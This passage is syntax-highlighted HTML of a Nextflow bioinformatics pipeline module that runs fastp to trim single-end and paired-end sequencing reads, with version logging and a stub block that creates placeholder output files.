class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            fastp: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">fastp </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"s/fastp //g"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta.single_end</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain">  </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sf</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$reads</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        fastp </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--in1</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$out_fq1</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--thread</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$task</span><span class="token plain">.cpus </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--json</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.json </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--html</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.html </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$adapter_list</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$fail_fastq</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$args</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.log </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            fastp: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">fastp </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"s/fastp //g"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        def merge_fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> save_merged ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-m --merged_out </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.merged.fastq.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain">  </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">_1.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sf</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${reads</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token variable" style="color:hsl(221, 87%, 60%)">0</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">_1.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain">  </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">_2.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sf</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${reads</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token variable" style="color:hsl(221, 87%, 60%)">1</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">_2.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        fastp </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--in1</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">_1.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--in2</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">_2.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$out_fq1</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$out_fq2</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--json</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.json </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--html</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.html </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$adapter_list</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$fail_fastq</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$merge_fastq</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--thread</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$task</span><span class="token plain">.cpus </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--detect_adapter_for_pe</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$args</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.log </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            fastp: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">fastp </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"s/fastp //g"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    stub:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def prefix              </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.prefix ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def is_single_output    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.args?.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'--interleaved_in'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> meta.single_end</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def touch_reads         </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">discard_trimmed_pass</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">is_single_output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"echo '' | gzip &gt; </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fastp.fastq.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"echo '' | gzip &gt; </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_1.fastp.fastq.gz ; echo '' | gzip &gt; </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_2.fastp.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def touch_merged        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">is_single_output </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> save_merged</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"echo '' | gzip &gt;  </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.merged.fastq.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def touch_fail_fastq    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">save_trimmed_fail</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> meta.single_end ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"echo '' | gzip &gt; </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fail.fastq.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"echo '' | gzip &gt; </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.paired.fail.fastq.gz ; echo '' | gzip &gt; </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_1.fail.fastq.gz ; echo '' | gzip &gt; </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_2.fail.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$touch_reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$touch_fail_fastq</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$touch_merged</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fastp.json"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fastp.html"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fastp.log"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" 